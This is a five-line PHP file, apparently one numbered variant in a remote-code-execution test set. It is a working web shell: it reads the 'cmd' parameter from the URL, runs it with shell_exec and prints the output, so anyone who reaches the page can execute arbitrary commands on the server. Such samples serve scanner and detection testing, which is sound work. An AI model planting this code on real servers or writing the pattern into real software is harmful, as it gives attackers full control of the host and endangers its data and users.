<?php
// RCE test variation #164
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>